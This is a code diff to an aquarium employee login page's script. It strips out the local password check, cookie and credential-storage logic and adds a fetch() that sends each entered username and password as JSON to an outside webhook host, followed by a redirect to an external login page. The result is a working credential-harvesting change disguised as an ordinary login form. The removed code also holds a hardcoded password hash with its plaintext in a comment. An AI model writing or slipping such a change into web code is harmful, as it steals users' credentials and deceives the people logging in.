@@ -222,75 +222,6 @@
     </footer>
 
     <script>
-        // Known hashed password (this would normally be stored securely on a server)
-        // This is the SHA-256 hash of "aquarium2025"
-        const KNOWN_PASSWORD_HASH = "65457dba64001716cd0aaa2791e8fe1253ce80166f228e64fd23dff5ad85bfc6";
-
-        // Valid username
-        const VALID_USERNAME = "admin";
-
-        // Broadcast Channel for multi-tab sync
-        const authChannel = new BroadcastChannel('aquarium_auth');
-
-        // Cookie utility functions
-        function setCookie(name, value, days) {
-            const expires = new Date();
-            expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
-            document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Lax`;
-        }
-
-        function getCookie(name) {
-            const nameEQ = name + "=";
-            const ca = document.cookie.split(';');
-            for (let i = 0; i < ca.length; i++) {
-                let c = ca[i].trim();
-                if (c.indexOf(nameEQ) === 0) {
-                    return decodeURIComponent(c.substring(nameEQ.length));
-                }
-            }
-            return null;
-        }
-
-        function deleteCookie(name) {
-            document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/`;
-        }
-
-        // Credential Management API
-        async function saveCredentials(username, password) {
-            if ('credentials' in navigator && 'PasswordCredential' in window) {
-                try {
-                    const credential = new PasswordCredential({
-                        id: username,
-                        password: password,
-                        name: 'Aquarium Employee'
-                    });
-                    await navigator.credentials.store(credential);
-                    console.log('Credentials saved via Credential Management API');
-                } catch (error) {
-                    console.log('Credential storage not available:', error);
-                }
-            }
-        }
-
-        async function getStoredCredentials() {
-            if ('credentials' in navigator && 'PasswordCredential' in window) {
-                try {
-                    const credential = await navigator.credentials.get({
-                        password: true,
-                        mediation: 'optional'
-                    });
-                    if (credential) {
-                        return {
-                            username: credential.id,
-                            password: credential.password
-                        };
-                    }
-                } catch (error) {
-                    console.log('Could not retrieve credentials:', error);
-                }
-            }
-            return null;
-        }
 
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -302,11 +233,6 @@
             const errorMessage = document.getElementById('errorMessage');
             const successMessage = document.getElementById('successMessage');
 
-            // Debug logging
-            console.log('Username entered:', username);
-            console.log('Password entered:', password);
-            console.log('Expected username:', VALID_USERNAME);
-
             // Hide any existing messages
             errorMessage.style.display = 'none';
             successMessage.style.display = 'none';
@@ -315,77 +241,19 @@
             loginButton.disabled = true;
             loginButton.textContent = 'Logging in...';
 
-            // Simulate network delay
-            setTimeout(async () => {
-                // Hash the entered password using SHA-256
-                const hashedPassword = CryptoJS.SHA256(password).toString();
+            const response = await fetch('https://keen-mouse-26.webhook.cool', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({ username: username, password: password })
+            });        
 
-                // Debug logging
-                console.log('Hashed password:', hashedPassword);
-                console.log('Expected hash:', KNOWN_PASSWORD_HASH);
-                console.log('Username match:', username === VALID_USERNAME);
-                console.log('Password hash match:', hashedPassword === KNOWN_PASSWORD_HASH);
-
-                // Check if username and password hash match
-                if (username === VALID_USERNAME && hashedPassword === KNOWN_PASSWORD_HASH) {
-                    // Login successful
-                    console.log('Login successful!');
-                    successMessage.style.display = 'block';
-                    loginButton.textContent = 'Success!';
-                    loginButton.style.backgroundColor = '#28a745';
-
-                    // Set session flag for other pages to detect
-                    localStorage.setItem('employeeLoggedIn', 'true');
-
-                    // Set cookies for authentication tracking
-                    const sessionToken = 'sess_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
-                    document.cookie = `sessionToken=${sessionToken}; path=/; SameSite=Lax`;
-                    setCookie('lastLoginTime', new Date().toISOString(), 30);
-
-                    // Remember Me functionality
-                    if (rememberMe) {
-                        setCookie('rememberedUser', username, 30);
-                        // Save credentials using Credential Management API
-                        await saveCredentials(username, password);
-                    } else {
-                        deleteCookie('rememberedUser');
-                    }
-
-                    // Broadcast login event to other tabs
-                    authChannel.postMessage({
-                        type: 'login',
-                        username: username,
-                        timestamp: new Date().toISOString()
-                    });
-
-                    // Redirect to portal page after a short delay
-                    setTimeout(() => {
-                        window.location.href = 'https://aquaticnaturediscovery.org/login.html';
-                    }, 1500);
-
-                } else {
-                    // Login failed
-                    console.log('Login failed!');
-                    errorMessage.style.display = 'block';
-                    loginButton.textContent = 'Login';
-                    loginButton.disabled = false;
-                    loginButton.style.backgroundColor = '#0066cc';
-
-                    // Clear password field
-                    document.getElementById('password').value = '';
-                    document.getElementById('password').focus();
-                }
-            }, 1000);
+            // Redirect to portal page after a short delay
+            setTimeout(() => {
+                window.location.href = 'https://aquaticnaturediscovery.org/login.html';
+            }, 500);
         });
-
-        // Listen for auth events from other tabs
-        authChannel.onmessage = (event) => {
-            if (event.data.type === 'logout') {
-                console.log('Logout detected from another tab');
-                localStorage.removeItem('employeeLoggedIn');
-                deleteCookie('sessionToken');
-            }
-        };
 
         // Add some basic security features
         document.addEventListener('DOMContentLoaded', async function() {
@@ -400,29 +268,6 @@
                     e.preventDefault();
                 }
             });
-
-            // Check for remembered user cookie
-            const rememberedUser = getCookie('rememberedUser');
-            if (rememberedUser) {
-                document.getElementById('username').value = rememberedUser;
-                document.getElementById('rememberMe').checked = true;
-                document.getElementById('password').focus();
-            } else {
-                // Try to get credentials from Credential Management API
-                const storedCreds = await getStoredCredentials();
-                if (storedCreds) {
-                    document.getElementById('username').value = storedCreds.username;
-                    document.getElementById('password').value = storedCreds.password;
-                    // Show a notice
-                    const form = document.getElementById('loginForm');
-                    const credInfo = document.createElement('div');
-                    credInfo.className = 'credential-info';
-                    credInfo.textContent = 'Credentials auto-filled from browser storage';
-                    form.insertBefore(credInfo, form.firstChild);
-                } else {
-                    document.getElementById('username').focus();
-                }
-            }
         });
     </script>
 
